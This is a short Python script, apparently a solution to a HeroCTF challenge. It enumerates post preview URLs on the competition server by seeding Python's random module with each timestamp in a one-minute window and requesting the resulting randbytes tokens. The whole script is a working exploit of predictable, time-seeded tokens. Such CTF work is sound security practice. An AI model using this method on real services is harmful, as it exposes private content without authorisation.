import requests
from datetime import datetime
from random import seed, randbytes

START_TIME = 1683946380 # Saturday, May 13, 2023 2:53:00 AM GMT
END_TIME = 1683946439 # Saturday, May 13, 2023 2:53:59 AM GMT
URL_PREFIX = "http://dyn-01.heroctf.fr:11915/post/preview/"

timestamp = START_TIME
seed(timestamp)
while timestamp <= END_TIME:
    url = f"{URL_PREFIX}{randbytes(32).hex()}"
    res = requests.get(url)
    if "Unable to find the corresponding post" in res.text:
        timestamp += 1
        seed(timestamp)
    else:
        print(f"Epoch time: {timestamp}")
        print(f"Post URL: {url}")
        break
print("Done")
